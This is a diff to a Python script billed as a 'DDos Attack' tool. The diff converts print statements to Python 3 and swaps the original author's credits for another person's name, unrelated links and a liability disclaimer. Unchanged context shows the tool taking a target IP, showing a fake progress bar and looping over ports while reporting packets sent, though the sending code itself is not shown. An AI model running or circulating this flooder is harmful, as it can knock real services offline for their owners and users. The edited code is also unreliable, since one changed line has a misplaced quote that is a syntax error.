@@ -36,17 +36,27 @@ os.system("clear")
 
 os.system("figlet DDos Attack")
 
-print
+print("")
 
-print "Author   : HA-MRX"
+print("[+] Tool Namee:DDos-Attack")
 
-print "You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA"
+print("[+] Author:Yousuf Shafi'i Muhammad. Junior Programmer")
 
-print "github   : https://github.com/Ha3MrX"
+print("[+] Version:1.0")
 
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print("[+] Team:Junior Programmers")
 
-print
+print("[+] Github:https://github.com/Yousuf9963/phone-num-info")
+
+print("[+] Follow me on Github: https://github.com/Yousuf9963")
+
+print("[-] Website muhammadabdirahman.wixsite.com/yousuf9963blog.")
+
+print("[!] legal disclaimer: Usage of this Program for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.")
+
+print("[+] I hope for you good future and i am willing that you will come high effort.")
+
+print("")
 
 ip = raw_input("IP Target : ")
 
@@ -56,23 +66,23 @@ os.system("clear")
 
 os.system("figlet Attack Starting")
 
-print "[                    ] 0% "
+print("[                    ] 0% ")
 
 time.sleep(5)
 
-print "[=====               ] 25%"
+print("[=====               ] 25%")
 
 time.sleep(5)
 
-print "[==========          ] 50%"
+print("[==========          ] 50%")
 
 time.sleep(5)
 
-print "[===============     ] 75%"
+print("[===============     ] 75%")
 
 time.sleep(5)
 
-print "[====================] 100%"
+print("[====================] 100%")
 
 time.sleep(3)
 
@@ -86,7 +96,7 @@ while True:
 
      port = port + 1
 
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print("Sent %s packet to %s throught port:%s"%(sent,ip,port")
 
      if port == 65534:
 
